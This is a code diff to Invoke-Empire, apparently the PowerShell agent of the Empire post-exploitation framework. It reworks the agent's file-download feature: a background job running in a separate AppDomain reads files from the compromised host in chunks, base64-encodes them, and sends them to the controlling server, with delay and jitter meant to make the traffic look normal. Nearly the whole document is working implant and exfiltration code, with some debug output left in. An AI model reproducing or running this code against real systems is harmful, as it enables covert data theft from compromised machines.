@@ -130,7 +130,7 @@ function Invoke-Empire {
     # keep track of all background jobs
     #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
     $Script:Jobs = @{}
-    $Script:Downloads = @{}
+
     # the currently imported script held in memory
     $script:ImportedScript = ''
 
@@ -389,28 +389,28 @@ function Invoke-Empire {
         "`n"+($output | Format-Table -wrap | Out-String)
     }
 
-    $DownloadFile = @"
+    #Download file script block that will run in the background
+
+    $Download = @"
 function Download-File {
-    param(`$Path,`$ChunkSize,`$type,`$ResultID,`$Delay,`$Jitter)
-    # read in and send the specified chunk size back for as long as the file has more parts
+    param(`$Type,`$Path,`$ResultID,`$ChunkSize,`$Delay,`$Jitter)
+
     `$Index = 0
     do{
         `$EncodedPart = Get-FilePart -File "`$Path" -Index `$Index -ChunkSize `$ChunkSize
-
-        if(`$EncodedPart) {
-            `$data = "{0}|{1}|{2}" -f `$Index, `$path, `$EncodedPart
-            Encode-Packet -type `$type -data `$(`$data) -ResultID `$ResultID)
+        if (`$EncodedPart) {
+            `$data = "{0}|{1}|{2}" -f `$Index,`$Path,`$EncodedPart
+            Encode-Packet -type `$Type -data `$(`$data) -ResultID `$ResultID
             `$Index += 1
 
-            # if there are more parts of the file, sleep for the specified interval
-            if (`$script:AgentDelay -ne 0) {
+            if (`$Delay -ne 0) {
                 `$min = [int]((1-`$Jitter)*`$Delay)
                 `$max = [int]((1+`$Jitter)*`$Delay)
 
                 if (`$min -eq `$max) {
                     `$sleepTime = `$min
                 }
-                else{
+                else {
                     `$sleepTime = Get-Random -minimum `$min -maximum `$max;
                 }
                 Start-Sleep -s `$sleepTime;
@@ -419,7 +419,7 @@ function Download-File {
         [GC]::Collect()
     } while(`$EncodedPart)
 
-    Encode-Packet -type 40 -data "[*] File download of `$path completed" -ResultID `$ResultID 
+    Encode-Packet -type 40 -data "[*] File download of `$Path completed" -ResultID `$ResultID
 }
 
 function Encode-Packet {
@@ -435,7 +435,7 @@ function Encode-Packet {
 
     # in case we get a result array, make sure we join everything up
     if (`$data -is [System.Array]) {
-        `$data = `$data -join "`n"
+        `$data = `$data -join "``n"
     }
 
     # convert data to base64 so we can support all encodings and handle on server side
@@ -457,6 +457,7 @@ function Encode-Packet {
 
     `$packet
 }
+
 function Get-FilePart {
     Param(
         [string] `$File,
@@ -529,19 +530,21 @@ function Get-FilePart {
     }
 }
 "@
+#Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
 
     function Start-DownloadJob {
-        param($ScriptString,$Type,$ResultID,$Path,$ChunkSize)
-        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
+        param($ScriptString, $type, $Path, $ResultID, $ChunkSize)
 
+        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
         # create our new AppDomain
         $AppDomain = [AppDomain]::CreateDomain($RandName)
 
         # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
 
+        $ScriptString = "$ScriptString`n Download-File -Type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
+
         # add the target script into the new runspace/appdomain
-        $ScriptString = "$ScriptString`n Download-File -type $Type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
         $null = $PSHost.AddScript($ScriptString)
 
         # stupid v2 compatibility...
@@ -552,10 +555,11 @@ function Get-FilePart {
         # kick off asynchronous execution
         $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))
 
-        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
+        $Script:Downloads[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
         $RandName
     }
 
+    # returns $True if the specified job is completed, $False otherwise
     function Get-DownloadJobCompleted {
         param($JobName)
         if($Script:Downloads.ContainsKey($JobName)) {
@@ -563,13 +567,16 @@ function Get-FilePart {
         }
     }
 
-    function Receive-AgentJob {
+    # reads any data from the output buffer preserved for the specified job
+    function Receive-DownloadJob {
         param($JobName)
         if($Script:Downloads.ContainsKey($JobName)) {
             $Script:Downloads[$JobName]['Buffer'].ReadAll()
         }
     }
 
+    # stops the specified agent job (wildcards accepted), returns any job results,
+    #   tear down the appdomain, and remove the job from the internal cache
     function Stop-DownloadJob {
         param($JobName)
         if($Script:Downloads.ContainsKey($JobName)) {
@@ -987,6 +994,7 @@ function Get-FilePart {
             }
             # file download
             elseif($type -eq 41) {
+                "In download task"
                 try {
                     $ChunkSize = 512KB
 
@@ -1021,10 +1029,12 @@ function Get-FilePart {
                         $ChunkSize = 8MB
                     }
 
+                    # resolve the complete path
                     $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
 
-                    $jobID = Start-DownloadJob -ScriptString $DownloadFile -Type $type -ResultID $ResultID -ChunkSize $ChunkSize -Path $Path
-                    $script:ResultIDs[$jobID]=$ResultID
+                    # read in and send the specified chunk size back for as long as the file has more parts
+                    $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
+                    "Called Start-DownloadJob: $jobID"
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
@@ -1206,7 +1216,7 @@ function Get-FilePart {
             ForEach($JobName in $Script:Downloads.Keys) {
                 $Results = Stop-DownloadJob -JobName $JobName
                 $JobResultID = $script:ResultIDs[$JobName]
-                $Packets += $Results
+                $Packets += $Results 
                 $script:ResultIDs.Remove($JobName)
             }
 
@@ -1276,7 +1286,6 @@ function Get-FilePart {
 
         # poll running jobs, receive any data, and remove any completed jobs
         $JobResults = $Null
-        $DownloadResults = $Null
         ForEach($JobName in $Script:Jobs.Keys) {
             $JobResultID = $script:ResultIDs[$JobName]
             # check if the job is still running
@@ -1299,20 +1308,20 @@ function Get-FilePart {
             if(Get-DownloadJobCompleted -JobName $JobName) {
                 # the job has stopped, so receive results/cleanup
                 $Results = Stop-DownloadJob -JobName $JobName
-                "Final data: $($Results.Length)"
+                "Job $JobName completed: size - $($Results.Length)"
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                "Received Data: $($Results.Length)"
+                "Job $JobName: Received data size - $($Results.Length)"
             }
 
             if($Results) {
-                $DownloadResults += $Results
+                $JobResults += $Results
             }
         }
 
         if ($JobResults) {
-            Send-Message -Packets $($JobResults + $DownloadResults)
+            Send-Message -Packets $JobResults
         }
 
         # get the next task from the server
